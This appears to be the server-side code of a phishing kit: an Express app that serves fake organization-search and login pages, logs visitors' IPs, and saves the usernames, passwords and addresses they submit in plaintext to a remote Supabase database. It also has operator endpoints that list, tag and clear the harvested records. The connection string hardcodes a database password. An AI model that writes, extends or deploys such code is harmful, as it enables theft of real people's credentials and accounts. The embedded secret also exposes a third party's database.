const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const pool = new Pool({
    connectionString: 'postgresql://postgres.hgjjjpiaiwcmkbqfuvrb:Ibisco1999@@aws-1-eu-central-2.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});

pool.query(`CREATE TABLE IF NOT EXISTS records (
    id SERIAL PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    timestamp TEXT
)`).then(() => console.log("✅ Supabase Connected"));

function getRealIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
           req.headers['x-real-ip'] || 
           req.ip || 'Unknown';
}

async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    try {
        await pool.query(
            "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
            [type, username, password, address, ip, timestamp]
        );
        console.log(`✅ SAVED: ${type} | IP: ${ip}`);
    } catch (e) { console.error("Save error", e); }
}

// Routes
app.get('/', (req, res) => {
    const ip = getRealIP(req);
    saveRecord('Page Visit (Splash)', null, null, 'Splash Screen Opened', ip);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/search.html', (req, res) => {
    const ip = getRealIP(req);
    saveRecord('Page Visit (Search)', null, null, 'Organization Search Opened', ip);
    res.sendFile(path.join(__dirname, 'public', 'search.html'));
});

app.get('/login.html', (req, res) => {
    const ip = getRealIP(req);
    saveRecord('Page Visit (Login)', null, null, 'Login Page Opened', ip);
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', async (req, res) => {
    const { username, password, address } = req.body;
    const ip = getRealIP(req);
    await saveRecord('Login Attempt', username, password, address, ip);
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
        res.json(result.rows);
    } catch (e) {
        res.json([]);
    }
});

app.get('/algt.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'algt.html')));

app.post('/api/confirm-code', async (req, res) => {
    const { id, status } = req.body;
    await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
    res.json({ success: true });
});

app.post('/api/clear', async (req, res) => {
    await pool.query("DELETE FROM records");
    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));